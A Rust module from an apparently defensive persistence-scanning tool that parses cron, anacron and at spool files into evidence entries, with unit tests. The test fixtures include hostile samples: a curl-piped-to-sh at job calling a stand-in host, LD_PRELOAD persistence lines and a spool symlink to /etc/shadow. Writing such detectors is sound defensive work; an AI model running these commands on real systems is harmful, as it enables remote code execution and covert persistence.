//! cron and at.
//!
//! Six spool layouts feed two kinds. Three parsing decisions here are easy to
//! get subtly wrong and are commented where they are made: what makes a line
//! an environment assignment rather than a job, where a command ends, and how
//! a line is named so that inserting a line above it does not re-identify it.

use std::collections::BTreeMap;
use std::ffi::OsStr;
use std::os::unix::ffi::OsStrExt;
use std::path::{Path, PathBuf};

use crate::entry::{Enablement, Entry, Flag, Kind, Trigger, name_from_os};
use crate::scan::{Collector, Ctx};

pub struct Cron;

impl Collector for Cron {
    fn name(&self) -> &'static str {
        "cron"
    }

    fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
        let mut out = Vec::new();
        let mut seen = Vec::new();

        crontab(cx, Path::new("etc/crontab"), Layout::SystemWide, &mut out);
        for ent in cx.dir("etc/cron.d") {
            let rel = Path::new("etc/cron.d").join(&ent.name);
            crontab(cx, &rel, Layout::SystemWide, &mut out);
        }

        for period in ["hourly", "daily", "weekly", "monthly"] {
            run_parts(cx, period, &mut out);
        }

        for dir in ["var/spool/cron", "var/spool/cron/crontabs"] {
            if !first_visit(cx, dir, &mut seen) {
                continue;
            }
            for ent in cx.dir(dir) {
                // The crontabs/ and atjobs/ spools live inside var/spool/cron.
                if ent.is_dir {
                    continue;
                }
                let rel = Path::new(dir).join(&ent.name);
                let user = ent.name.to_string_lossy().into_owned();
                crontab(cx, &rel, Layout::ForUser(&user), &mut out);
            }
        }

        anacrontab(cx, &mut out);

        for dir in ["var/spool/cron/atjobs", "var/spool/at"] {
            if !first_visit(cx, dir, &mut seen) {
                continue;
            }
            for ent in cx.dir(dir) {
                // .SEQ and its friends are atd's own bookkeeping, not jobs.
                if ent.is_dir || ent.name.as_bytes().starts_with(b".") {
                    continue;
                }
                let rel = Path::new(dir).join(&ent.name);
                at_job(cx, &rel, &ent.name, &mut out);
            }
        }

        out
    }
}

/// The two crontab layouts. The system files carry a user field between the
/// schedule and the command; a user's own spool file does not, and takes its
/// principal from the filename instead.
enum Layout<'a> {
    SystemWide,
    ForUser(&'a str),
}

impl Layout<'_> {
    fn principal(&self) -> Option<String> {
        match self {
            Layout::SystemWide => None,
            Layout::ForUser(u) => Some((*u).to_string()),
        }
    }
}

struct Job<'a> {
    schedule: &'a [u8],
    user: Option<&'a [u8]>,
    command: &'a [u8],
}

fn crontab(cx: &mut Ctx, rel: &Path, layout: Layout<'_>, out: &mut Vec<Entry>) {
    if is_symlink(cx, rel) {
        out.push(unparsed_link(cx, Kind::Cron, rel, layout.principal()));
        return;
    }
    let Some(bytes) = cx.read(rel) else { return };
    let crlf = has_crlf(&bytes);
    let mut env: BTreeMap<String, String> = BTreeMap::new();
    let mut used = BTreeMap::new();

    for line in bytes.split(|b| *b == b'\n') {
        let line = trim(line);
        if line.is_empty() || line[0] == b'#' {
            continue;
        }
        if let Some((k, v)) = env_assignment(line) {
            env.insert(k, v);
            continue;
        }

        let mut e = match split_job(line, &layout) {
            Some(job) => {
                let (name, dup) = unique(&mut used, job_name(job.schedule, job.command));
                let mut e = cx.entry(Kind::Cron, rel, &name);
                if dup > 1 {
                    // Two byte-identical lines in one file derive the same
                    // name. They are still two jobs and need two ids.
                    e.note("duplicate_line", dup.to_string());
                }
                e.trigger = shortcut(job.schedule).unwrap_or(Trigger::Schedule);
                e.enabled = Enablement::Enabled;
                e.principal = match job.user {
                    Some(u) => Some(String::from_utf8_lossy(u).into_owned()),
                    None => layout.principal(),
                };
                e.note("schedule", String::from_utf8_lossy(job.schedule));
                if shortcut(job.schedule).is_none() {
                    if let Some(bad) = odd_field(job.schedule) {
                        e.note("schedule_suspect", String::from_utf8_lossy(bad));
                    }
                }
                let (command, stdin) = split_stdin(job.command);
                if let Some(s) = stdin {
                    e.note("stdin", String::from_utf8_lossy(s));
                }
                set_command(&mut e, command);
                e.target_path = command_target(command, &mut e);
                e
            }
            None => malformed(cx, rel, line, layout.principal(), &mut used),
        };

        // An assignment on the command line overrides the file-level one at
        // run time, so where both exist the inline value already set wins.
        for (k, v) in &env {
            e.raw.entry(format!("env.{k}")).or_insert_with(|| v.clone());
        }
        if crlf {
            e.note("line_ending", "crlf");
        }
        out.push(e);
    }
}

/// /etc/cron.{hourly,daily,weekly,monthly}. These are scripts run by
/// run-parts, not crontab lines: there is no command to parse, the script
/// itself is the target, and the schedule comes from the directory.
fn run_parts(cx: &mut Ctx, period: &str, out: &mut Vec<Entry>) {
    let dir = format!("etc/cron.{period}");
    for ent in cx.dir(&dir) {
        if ent.is_dir {
            continue;
        }
        let rel = Path::new(&dir).join(&ent.name);
        let mut e = cx.entry(Kind::Cron, &rel, ent.name.to_string_lossy());
        name_from_os(&mut e, &ent.name);
        e.trigger = Trigger::Schedule;
        e.principal = Some("root".to_string());
        e.target_path = Some(cx.root.abs(&rel));
        e.note("schedule", format!("@{period}"));
        // run-parts runs what is executable and skips the rest, which is how
        // a .dpkg-old copy of a script stops running.
        e.enabled = if e.mode & 0o111 != 0 { Enablement::Enabled } else { Enablement::Disabled };
        out.push(e);
    }
}

/// /etc/anacrontab: period, delay, job identifier, command. The identifier is
/// anacron's own name for the job and is already position-independent, so it
/// is the entry name — editing the command then diffs as Changed rather than
/// as a removal plus an addition.
fn anacrontab(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let rel = Path::new("etc/anacrontab");
    if is_symlink(cx, rel) {
        out.push(unparsed_link(cx, Kind::Cron, rel, Some("root".to_string())));
        return;
    }
    let Some(bytes) = cx.read(rel) else { return };
    let crlf = has_crlf(&bytes);
    let mut env: BTreeMap<String, String> = BTreeMap::new();
    let mut used = BTreeMap::new();

    for line in bytes.split(|b| *b == b'\n') {
        let line = trim(line);
        if line.is_empty() || line[0] == b'#' {
            continue;
        }
        if let Some((k, v)) = env_assignment(line) {
            env.insert(k, v);
            continue;
        }

        let mut e = match anacron_job(line) {
            Some((period, delay, id, command)) => {
                let (name, dup) = unique(&mut used, String::from_utf8_lossy(id).into_owned());
                let mut e = cx.entry(Kind::Cron, rel, &name);
                if dup > 1 {
                    e.note("duplicate_job_identifier", dup.to_string());
                }
                e.trigger = Trigger::Schedule;
                e.enabled = Enablement::Enabled;
                e.principal = Some("root".to_string());
                e.note("schedule", String::from_utf8_lossy(period));
                e.note("delay_minutes", String::from_utf8_lossy(delay));
                set_command(&mut e, command);
                e.target_path = command_target(command, &mut e);
                e
            }
            None => malformed(cx, rel, line, Some("root".to_string()), &mut used),
        };

        for (k, v) in &env {
            e.raw.entry(format!("env.{k}")).or_insert_with(|| v.clone());
        }
        if crlf {
            e.note("line_ending", "crlf");
        }
        out.push(e);
    }
}

fn anacron_job(line: &[u8]) -> Option<(&[u8], &[u8], &[u8], &[u8])> {
    let (period, rest) = take_fields(line, 1)?;
    let (delay, rest) = take_fields(rest, 1)?;
    let (id, rest) = take_fields(rest, 1)?;
    let command = trim(rest);
    if command.is_empty() {
        return None;
    }
    Some((period, delay, id, command))
}

/// One at job. The spool file is a shell script with a generated preamble;
/// the body below it is what was submitted.
fn at_job(cx: &mut Ctx, rel: &Path, fname: &OsStr, out: &mut Vec<Entry>) {
    if is_symlink(cx, rel) {
        out.push(unparsed_link(cx, Kind::AtJob, rel, None));
        return;
    }
    let Some(bytes) = cx.read(rel) else { return };
    let (body_at, uid, env) = at_preamble(&bytes);

    let mut e = cx.entry(Kind::AtJob, rel, fname.to_string_lossy());
    name_from_os(&mut e, fname);
    e.trigger = Trigger::Schedule;
    e.enabled = Enablement::Enabled;

    // a0000101234567: queue letter, five hex digits of job number, eight hex
    // digits of the run time in minutes since the epoch.
    let n = fname.as_bytes();
    if n.len() >= 14 && n[0].is_ascii_alphabetic() && n[1..14].iter().all(u8::is_ascii_hexdigit) {
        e.note("queue", String::from_utf8_lossy(&n[..1]));
        e.note("job_number", String::from_utf8_lossy(&n[1..6]));
        if let Ok(minutes) = u64::from_str_radix(&String::from_utf8_lossy(&n[6..14]), 16) {
            e.note("run_at_unix", (minutes * 60).to_string());
        }
    } else {
        e.note("filename_unrecognised", "not the queue-letter, job-number, run-time form");
    }

    let uid = uid.unwrap_or(e.owner_uid);
    e.note("uid", uid.to_string());
    e.principal = Some(match cx.users.iter().find(|u| u.uid == Some(uid)) {
        Some(u) => u.name.clone(),
        None => uid.to_string(),
    });
    for (k, v) in env {
        e.note(&format!("env.{k}"), v);
    }

    let body = &bytes[body_at.min(bytes.len())..];
    if body.iter().all(|b| b.is_ascii_whitespace()) {
        e.note("parse_error", "no job body below the generated preamble");
    }
    set_command(&mut e, body);
    out.push(e);
}

/// at writes the submitting environment into the top of the job script: a
/// shebang, comments, `umask`, `NAME=value; export NAME` lines and a
/// `cd ... || { ... }` guard. Returns where that preamble ends, the uid atd
/// will run the job as, and the environment it carries — LD_PRELOAD included.
fn at_preamble(bytes: &[u8]) -> (usize, Option<u32>, BTreeMap<String, String>) {
    let mut env = BTreeMap::new();
    let mut uid = None;
    let mut at = 0;
    let mut in_guard = false;

    for line in bytes.split(|b| *b == b'\n') {
        let advance = line.len() + 1;
        let t = trim(line);
        if in_guard {
            at += advance;
            if t == b"}" {
                in_guard = false;
            }
            continue;
        }
        if t.is_empty() || t[0] == b'#' {
            if let Some(u) = uid_field(t) {
                uid = Some(u);
            }
        } else if t.starts_with(b"umask ") || t.starts_with(b"export ") {
            // preamble, nothing to record
        } else if t.starts_with(b"cd ") {
            in_guard = t.ends_with(b"{");
        } else if let Some((k, v)) = at_env(t) {
            env.insert(k, v);
        } else {
            break;
        }
        at += advance;
    }
    (at.min(bytes.len()), uid, env)
}

/// `NAME=value; export NAME`, as at writes it. The trailing export is part of
/// the generated form, not of the value.
fn at_env(line: &[u8]) -> Option<(String, String)> {
    let (name, raw) = assignment(line)?;
    let name = String::from_utf8_lossy(name).into_owned();
    let mut value = raw;
    let suffix = format!("; export {name}");
    if value.ends_with(suffix.as_bytes()) {
        value = &value[..value.len() - suffix.len()];
    }
    Some((name, String::from_utf8_lossy(unquote(value)).into_owned()))
}

fn uid_field(line: &[u8]) -> Option<u32> {
    let i = line.windows(4).position(|w| w == b"uid=")?;
    let rest = &line[i + 4..];
    let end = rest.iter().position(|b| !b.is_ascii_digit()).unwrap_or(rest.len());
    String::from_utf8_lossy(&rest[..end]).parse().ok()
}

/// Splits a crontab line into schedule, user and command, or reports that it
/// is not a job line at all.
fn split_job<'a>(line: &'a [u8], layout: &Layout<'_>) -> Option<Job<'a>> {
    // The @ shortcuts replace all five schedule fields with one token.
    let count = if line[0] == b'@' { 1 } else { 5 };
    let (schedule, rest) = take_fields(line, count)?;
    if count == 1 && shortcut(schedule).is_none() {
        return None;
    }
    let (user, rest) = match layout {
        Layout::SystemWide => {
            let (u, r) = take_fields(rest, 1)?;
            (Some(u), r)
        }
        Layout::ForUser(_) => (None, rest),
    };
    // Everything after the last field is the command, `#` and all.
    let command = trim_start(rest);
    if command.is_empty() {
        return None;
    }
    Some(Job { schedule, user, command })
}

fn shortcut(s: &[u8]) -> Option<Trigger> {
    match String::from_utf8_lossy(s).to_ascii_lowercase().as_str() {
        "@reboot" => Some(Trigger::Boot),
        "@yearly" | "@annually" | "@monthly" | "@weekly" | "@daily" | "@midnight" | "@hourly" => {
            Some(Trigger::Schedule)
        }
        _ => None,
    }
}

/// Cron fields are `*`, numbers, ranges, steps, lists and three-letter month
/// and day names. A field outside that character set will not load, which is
/// worth recording rather than asserting the job runs.
fn odd_field(schedule: &[u8]) -> Option<&[u8]> {
    schedule
        .split(|b: &u8| b.is_ascii_whitespace())
        .filter(|f| !f.is_empty())
        .find(|f| !f.iter().all(|b| b.is_ascii_alphanumeric() || b"*,-/~".contains(b)))
}

/// A `%` that is not backslash-escaped ends the command; what follows is the
/// job's standard input.
fn split_stdin(cmd: &[u8]) -> (&[u8], Option<&[u8]>) {
    let mut i = 0;
    while i < cmd.len() {
        match cmd[i] {
            b'\\' => i += 2,
            b'%' => return (&cmd[..i], Some(&cmd[i + 1..])),
            _ => i += 1,
        }
    }
    (cmd, None)
}

/// Leading `NAME=value` words belong to the command line, not to the program:
/// `* * * * * root LD_PRELOAD=/tmp/x /bin/sh` runs /bin/sh. The assignments
/// are recorded, since that is one of the places a preload hides.
fn command_target(cmd: &[u8], e: &mut Entry) -> Option<PathBuf> {
    let mut rest = cmd;
    while let Some((word, tail)) = take_fields(rest, 1) {
        if let Some((k, v)) = env_assignment(word) {
            e.note(&format!("env.{k}"), v);
            rest = tail;
            continue;
        }
        let word = super::shell_word(word);
        return word.starts_with(b"/").then(|| path(word));
    }
    None
}

/// Is this line an environment assignment rather than a job? cron's own rule:
/// read a name up to whitespace or `=`, allow whitespace, and require the `=`
/// next. `* * * * * FOO=bar cmd` fails it at the second `*` and stays a job.
fn env_assignment(line: &[u8]) -> Option<(String, String)> {
    let (name, value) = assignment(line)?;
    Some((
        String::from_utf8_lossy(name).into_owned(),
        String::from_utf8_lossy(unquote(value)).into_owned(),
    ))
}

fn assignment(line: &[u8]) -> Option<(&[u8], &[u8])> {
    let mut i = 0;
    while i < line.len() && !line[i].is_ascii_whitespace() && line[i] != b'=' {
        i += 1;
    }
    if i == 0 {
        return None;
    }
    let name = &line[..i];
    while i < line.len() && line[i].is_ascii_whitespace() {
        i += 1;
    }
    if line.get(i) != Some(&b'=') {
        return None;
    }
    i += 1;
    while i < line.len() && line[i].is_ascii_whitespace() {
        i += 1;
    }
    Some((name, &line[i..]))
}

fn unquote(v: &[u8]) -> &[u8] {
    match v {
        [q @ (b'"' | b'\''), inner @ .., last] if q == last => inner,
        _ => v,
    }
}

/// Position-independent identity (§4). The name is derived from what the job
/// *is* — its schedule and its command — never from where it sits in the
/// file, so inserting a line at the top of /etc/crontab does not re-identify
/// everything below it. Width is 96 bits: the name is hashed into the entry
/// id, and §4's arithmetic rules out anything narrower for a value that
/// decides whether two entries are the same entry.
fn job_name(schedule: &[u8], command: &[u8]) -> String {
    let mut h = blake3::Hasher::new();
    for part in [&normalise_ws(schedule)[..], command] {
        h.update(&(part.len() as u64).to_le_bytes());
        h.update(part);
    }
    let hex = h.finalize().to_hex();
    hex[..24].to_string()
}

/// Reformatting the whitespace between schedule fields does not change which
/// job a line is, so it must not change the name either.
fn normalise_ws(s: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(s.len());
    for f in s.split(|b: &u8| b.is_ascii_whitespace()).filter(|f| !f.is_empty()) {
        if !out.is_empty() {
            out.push(b' ');
        }
        out.extend_from_slice(f);
    }
    out
}

fn unique(used: &mut BTreeMap<String, u32>, base: String) -> (String, u32) {
    let n = used.entry(base.clone()).or_insert(0);
    *n += 1;
    if *n == 1 { (base, 1) } else { (format!("{base}-{n}"), *n) }
}

/// A line that parses as neither a job nor an assignment is still evidence:
/// it is reported with what it says and why it was not understood, rather
/// than dropped.
fn malformed(
    cx: &mut Ctx,
    rel: &Path,
    line: &[u8],
    principal: Option<String>,
    used: &mut BTreeMap<String, u32>,
) -> Entry {
    let (name, dup) = unique(used, job_name(b"", line));
    let mut e = cx.entry(Kind::Cron, rel, &name);
    if dup > 1 {
        e.note("duplicate_line", dup.to_string());
    }
    e.trigger = Trigger::Schedule;
    e.enabled = Enablement::Unknown;
    e.principal = principal;
    e.note("parse_error", "neither a job line nor an environment assignment");
    set_command(&mut e, line);
    e
}

/// Reading through a link in a spool would paste whatever it points at — the
/// shadow file is the classic — into the report as if it were cron syntax.
/// The link is evidence; its target's contents are not ours to read.
fn unparsed_link(cx: &mut Ctx, kind: Kind, rel: &Path, principal: Option<String>) -> Entry {
    let name = rel.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    let mut e = cx.entry(kind, rel, name);
    e.trigger = Trigger::Schedule;
    e.enabled = Enablement::Unknown;
    e.principal = principal;
    e.note("parse_error", "source is a symlink; its target was not read");
    e
}

fn set_command(e: &mut Entry, bytes: &[u8]) {
    if std::str::from_utf8(bytes).is_err() {
        e.flag(Flag::EncodingAnomaly);
    }
    if bytes.contains(&0) {
        e.note("command_nul", "true");
    }
    e.command = Some(bytes.to_vec());
}

fn is_symlink(cx: &Ctx, rel: &Path) -> bool {
    cx.root.stat(rel).map(|m| m.is_symlink).unwrap_or(false)
}

/// Two spool paths can be one directory — /var/spool/at is a link to the at
/// jobs spool on some layouts — and walking it twice would emit every job
/// twice under two source paths that never reconcile in a diff.
fn first_visit(cx: &Ctx, rel: &str, seen: &mut Vec<(u64, u64)>) -> bool {
    match cx.root.dir_identity(rel) {
        Ok(id) if seen.contains(&id) => false,
        Ok(id) => {
            seen.push(id);
            true
        }
        // Absent or unreadable; cx.dir records which.
        Err(_) => true,
    }
}

/// Splits `n` whitespace-separated fields off the front, returning the span
/// they cover and what follows them.
fn take_fields(s: &[u8], n: usize) -> Option<(&[u8], &[u8])> {
    let mut i = 0;
    while i < s.len() && s[i].is_ascii_whitespace() {
        i += 1;
    }
    let begin = i;
    let mut end = i;
    for _ in 0..n {
        while i < s.len() && s[i].is_ascii_whitespace() {
            i += 1;
        }
        let start = i;
        while i < s.len() && !s[i].is_ascii_whitespace() {
            i += 1;
        }
        if i == start {
            return None;
        }
        end = i;
    }
    Some((&s[begin..end], &s[i..]))
}

fn trim(s: &[u8]) -> &[u8] {
    let mut a = 0;
    let mut b = s.len();
    while a < b && s[a].is_ascii_whitespace() {
        a += 1;
    }
    while b > a && s[b - 1].is_ascii_whitespace() {
        b -= 1;
    }
    &s[a..b]
}

fn trim_start(s: &[u8]) -> &[u8] {
    let mut a = 0;
    while a < s.len() && s[a].is_ascii_whitespace() {
        a += 1;
    }
    &s[a..]
}

fn has_crlf(bytes: &[u8]) -> bool {
    bytes.windows(2).any(|w| w == b"\r\n")
}

fn path(bytes: &[u8]) -> PathBuf {
    PathBuf::from(OsStr::from_bytes(bytes).to_os_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::root::Root;
    use crate::scan::{Options, Scan, Status};
    use std::os::unix::fs::PermissionsExt;

    fn tree(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("unbidden-cron-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn put(dir: &Path, rel: &str, body: &[u8]) {
        let p = dir.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(&p, body).unwrap();
    }

    fn chmod(dir: &Path, rel: &str, mode: u32) {
        std::fs::set_permissions(dir.join(rel), PermissionsExt::from_mode(mode)).unwrap();
    }

    fn scan(dir: &Path) -> Scan {
        let root = Root::at(dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Cron)];
        crate::scan::run(&root, &Options { deep: false }, &collectors)
    }

    fn text(e: &Entry) -> String {
        String::from_utf8_lossy(e.command.as_deref().unwrap_or(b"")).into_owned()
    }

    fn find<'a>(s: &'a Scan, needle: &str) -> &'a Entry {
        s.entries.iter().find(|e| text(e).contains(needle)).unwrap_or_else(|| panic!("no entry whose command contains {needle:?}"))
    }

    fn named<'a>(s: &'a Scan, name: &str) -> &'a Entry {
        s.entries.iter().find(|e| e.name == name).unwrap_or_else(|| panic!("no entry named {name:?}"))
    }

    #[test]
    fn system_crontab_carries_user_schedule_and_command() {
        let dir = tree("system");
        put(&dir, "etc/crontab", b"# /etc/crontab: the system-wide crontab\nMAILTO=\"\"\nPATH=/usr/local/bin:/usr/bin\n\n17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly # keep me\n@reboot root LD_PRELOAD=/tmp/e.so /usr/bin/agent\n30 4 * * 1-5 backup /usr/local/bin/dump%first line of input\n0 0 * * * root echo 100\\% done%mail body\n");
        let s = scan(&dir);
        assert_eq!(s.entries.len(), 4, "four job lines, and neither the comment nor the assignments");

        let hourly = find(&s, "run-parts");
        assert_eq!(hourly.kind, Kind::Cron);
        assert_eq!(hourly.principal.as_deref(), Some("root"));
        assert_eq!(hourly.trigger, Trigger::Schedule);
        assert_eq!(hourly.raw["schedule"], "17 *\t* * *");
        assert_eq!(text(hourly), "cd / && run-parts --report /etc/cron.hourly # keep me", "a # inside the command is part of it");
        assert_eq!(hourly.target_path, None, "cd is not a path");
        assert_eq!(hourly.raw["env.PATH"], "/usr/local/bin:/usr/bin");
        assert_eq!(hourly.raw["env.MAILTO"], "", "a quoted empty value is still an assignment");

        let boot = find(&s, "/usr/bin/agent");
        assert_eq!(boot.trigger, Trigger::Boot, "@reboot fires at boot, not on a schedule");
        assert_eq!(boot.raw["schedule"], "@reboot");
        assert_eq!(boot.principal.as_deref(), Some("root"));
        assert_eq!(boot.raw["env.LD_PRELOAD"], "/tmp/e.so", "an assignment on the command line is still an assignment");
        assert_eq!(boot.target_path, Some(PathBuf::from("/usr/bin/agent")), "the preload assignment is not the program");

        let dump = find(&s, "/usr/local/bin/dump");
        assert_eq!(text(dump), "/usr/local/bin/dump", "the command ends at the first unescaped %");
        assert_eq!(dump.raw["stdin"], "first line of input");
        assert_eq!(dump.principal.as_deref(), Some("backup"));

        let escaped = find(&s, "echo 100");
        assert_eq!(text(escaped), "echo 100\\% done", "a backslash-escaped % does not end the command");
        assert_eq!(escaped.raw["stdin"], "mail body");

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn inserting_a_line_does_not_reidentify_the_ones_below_it() {
        let dir = tree("insert");
        put(&dir, "etc/crontab", b"0 1 * * * root /a\n0 2 * * * root /b\n");
        let before: Vec<String> = scan(&dir).entries.iter().map(|e| e.id.clone()).collect();
        assert_eq!(before.len(), 2);

        put(&dir, "etc/crontab", b"@reboot root /new\n0 1 * * * root /a\n0  2  *  *  *  root /b\n");
        let after: Vec<String> = scan(&dir).entries.iter().map(|e| e.id.clone()).collect();
        assert_eq!(after.len(), 3);
        for id in &before {
            assert!(after.contains(id), "a line moved down the file and lost its identity");
        }
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn two_identical_lines_are_two_entries_with_two_ids() {
        let dir = tree("dup");
        put(&dir, "etc/cron.d/twice", b"* * * * * root /bin/x\n* * * * * root /bin/x\n");
        let s = scan(&dir);
        assert_eq!(s.entries.len(), 2);
        assert_ne!(s.entries[0].id, s.entries[1].id, "a duplicate id would silently drop one of them");
        assert!(s.entries.iter().any(|e| e.raw.get("duplicate_line").map(String::as_str) == Some("2")));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn hostile_input_is_recorded_rather_than_fatal() {
        let dir = tree("hostile");
        put(&dir, "etc/shadow", b"root:$6$notreal$hash:19000:0:99999:7:::\n");
        std::fs::create_dir_all(dir.join("var/spool/cron/crontabs")).unwrap();
        std::os::unix::fs::symlink("/etc/shadow", dir.join("var/spool/cron/crontabs/victim")).unwrap();
        std::fs::create_dir_all(dir.join("etc/cron.d/adir")).unwrap();

        // Anything past the read cap exercises the same path as the 10 MB
        // line this stands in for, without the 10 MB.
        let mut huge = b"* * * * * root /bin/x ".to_vec();
        huge.extend(std::iter::repeat_n(b'A', 2 * crate::root::READ_CAP));
        put(&dir, "etc/cron.d/huge", &huge);

        put(&dir, "etc/crontab", b"* * * * * root /bin/ev\x00il\r\n* * * * * root /bin/\xff\xfe\r\n* * *\r\n@nosuch root /bin/y\r\n");

        let s = scan(&dir);
        let status = &s.header.collectors[0].status;
        assert!(!matches!(status, Status::Failed { .. }), "hostile input must not take the collector out: {status:?}");

        let report = serde_json::to_string(&s.entries).unwrap();
        assert!(!report.contains("notreal"), "a spool symlink was followed into the shadow file");
        assert!(s.entries.iter().any(|e| e.raw.get("parse_error").is_some_and(|p| p.contains("symlink"))));

        assert!(s.entries.iter().any(|e| e.raw.contains_key("command_nul")), "an embedded NUL must be reported");
        assert!(s.entries.iter().any(|e| e.has_flag(Flag::EncodingAnomaly)), "invalid UTF-8 in a command is evidence");
        assert_eq!(
            s.entries.iter().filter(|e| e.raw.get("parse_error").is_some_and(|p| p.starts_with("neither"))).count(),
            2,
            "the short line and the unknown @shortcut are both reported, not dropped"
        );
        assert!(s.entries.iter().filter(|e| e.source.ends_with("crontab")).all(|e| e.raw["line_ending"] == "crlf"));

        let truncated = s.header.collectors[0].truncated.join("\n");
        assert!(truncated.contains("read to"), "the 10 MB line is capped and said so: {truncated}");
        // A directory planted where a crontab belongs is reported, but it
        // does not demote the collector: an attacker must not be able to
        // declare the whole baseline incomparable by creating one.
        assert!(truncated.contains("adir"), "a crontab that is a directory is reported: {truncated}");
        assert!(
            !matches!(status, Status::Failed { .. }),
            "hostile input must not kill the collector: {status:?}"
        );
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn run_parts_scripts_spool_crontabs_and_anacron() {
        let dir = tree("dirs");
        put(&dir, "etc/cron.daily/backup", b"#!/bin/sh\n/usr/local/bin/backup\n");
        chmod(&dir, "etc/cron.daily/backup", 0o755);
        put(&dir, "etc/cron.daily/backup.dpkg-old", b"#!/bin/sh\n");
        chmod(&dir, "etc/cron.daily/backup.dpkg-old", 0o644);
        put(&dir, "var/spool/cron/crontabs/alice", b"MAILTO=alice\n*/5 * * * * /usr/bin/x\n");
        put(&dir, "etc/anacrontab", b"START_HOURS_RANGE=3-22\n1 5 cron.daily run-parts --report /etc/cron.daily\n@monthly 30 clean /tmp/x\n");
        let s = scan(&dir);

        let script = named(&s, "backup");
        assert_eq!(script.command, None, "a run-parts script has no parseable command line");
        assert_eq!(script.target_path, Some(dir.join("etc/cron.daily/backup")));
        assert_eq!(script.principal.as_deref(), Some("root"));
        assert_eq!(script.raw["schedule"], "@daily", "the schedule comes from the directory");
        assert_eq!(script.enabled, Enablement::Enabled);
        assert_eq!(named(&s, "backup.dpkg-old").enabled, Enablement::Disabled, "run-parts skips what is not executable");

        let alice = find(&s, "/usr/bin/x");
        assert_eq!(alice.principal.as_deref(), Some("alice"), "a spool crontab takes its user from the filename");
        assert_eq!(alice.raw["schedule"], "*/5 * * * *", "five fields, no user field");
        assert_eq!(alice.raw["env.MAILTO"], "alice");

        let daily = named(&s, "cron.daily");
        assert_eq!(text(daily), "run-parts --report /etc/cron.daily");
        assert_eq!(daily.raw["schedule"], "1");
        assert_eq!(daily.raw["delay_minutes"], "5");
        assert_eq!(daily.principal.as_deref(), Some("root"));
        assert_eq!(daily.raw["env.START_HOURS_RANGE"], "3-22");
        assert_eq!(named(&s, "clean").target_path, Some(PathBuf::from("/tmp/x")));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn at_job_body_survives_the_generated_header() {
        let dir = tree("at");
        put(&dir, "etc/passwd", b"alice:x:1000:1000::/home/alice:/bin/bash\n");
        put(&dir, "var/spool/cron/atjobs/a0000101234567", b"#!/bin/sh\n# atrun uid=1000 gid=1000\n# mail alice 0\numask 22\nPATH=/usr/bin:/bin; export PATH\nLD_PRELOAD=/tmp/e.so; export LD_PRELOAD\ncd /home/alice || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 100\n}\n${SHELL:-/bin/sh} << 'marker'\n/usr/bin/curl http://x/y | sh\nmarker\n");
        put(&dir, "var/spool/cron/atjobs/.SEQ", b"0001\n");
        let s = scan(&dir);

        assert_eq!(s.entries.len(), 1, "atd's own .SEQ bookkeeping is not a job");
        let e = &s.entries[0];
        assert_eq!(e.kind, Kind::AtJob);
        assert_eq!(e.raw["queue"], "a");
        assert_eq!(e.raw["job_number"], "00001");
        assert_eq!(e.principal.as_deref(), Some("alice"), "the uid in the header names the account");
        assert_eq!(e.raw["env.LD_PRELOAD"], "/tmp/e.so", "the submitted environment is part of the job");
        assert_eq!(e.raw["env.PATH"], "/usr/bin:/bin");
        let body = text(e);
        assert!(body.starts_with("${SHELL:-/bin/sh}"), "the body starts below the generated header: {body:?}");
        assert!(body.contains("/usr/bin/curl http://x/y | sh"));
        std::fs::remove_dir_all(&dir).unwrap();
    }
}
